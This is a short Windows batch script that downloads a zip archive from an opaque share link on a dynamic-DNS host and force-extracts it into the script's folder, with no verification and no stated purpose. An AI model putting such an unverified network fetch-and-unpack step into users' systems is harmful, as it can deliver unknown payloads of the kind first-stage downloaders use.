@echo off

powershell -command "& { Invoke-WebRequest -Uri 'http://39v04f7212.wicp.vip/share/42068faa-7dde-4a07-93cc-3d69fb56a48f' -OutFile 'zjw.zip' }"
sleep 3
chcp 65001 >nul
setlocal enabledelayedexpansion
cd /d "%~dp0"
for %%f in (zjw.zip) do (
    echo Extracting: %%f
    powershell -command "Expand-Archive -Path '%%f' -DestinationPath './' -Force"
)